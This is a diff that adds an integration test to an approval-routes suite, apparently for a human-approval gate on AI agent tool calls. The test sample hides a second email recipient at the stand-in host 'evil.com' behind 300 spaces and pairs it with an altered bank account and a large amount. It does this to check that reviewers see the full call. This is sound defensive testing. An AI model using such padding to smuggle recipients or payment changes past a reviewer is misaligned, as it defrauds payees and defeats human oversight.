@@ -331,6 +331,30 @@ describe("approval routes (integration, real DB)", () => {
     expect(list.approvals[0].argsSummary).toEqual({ recordId: 5 });
   });
 
+  it("stores what will actually run: a smuggled second recipient and the full odoo values stay visible", async () => {
+    await gateCheck(
+      gateReq(
+        gateBody({
+          toolName: "odoo_write",
+          params: {
+            to: `chef@firma.at${" ".repeat(300)}, angreifer@evil.com`,
+            ids: [42],
+            values: { acc_number: "AT61 1904 3002 3457 3201", amount: 99999 },
+          },
+        })
+      )
+    );
+    setSession(user);
+    const list = await (
+      await listApprovals(new NextRequest("http://localhost/api/approvals"), {})
+    ).json();
+    expect(list.approvals[0].argsSummary).toEqual({
+      to: ["chef@firma.at", "angreifer@evil.com"],
+      ids: [42],
+      values: { acc_number: "AT61 1904 3002 3457 3201", amount: 99999 },
+    });
+  });
+
   it("does not list expired pending confirmations (no dead cards in the inbox)", async () => {
     await db.insert(toolApproval).values({
       agentId: agent.id,
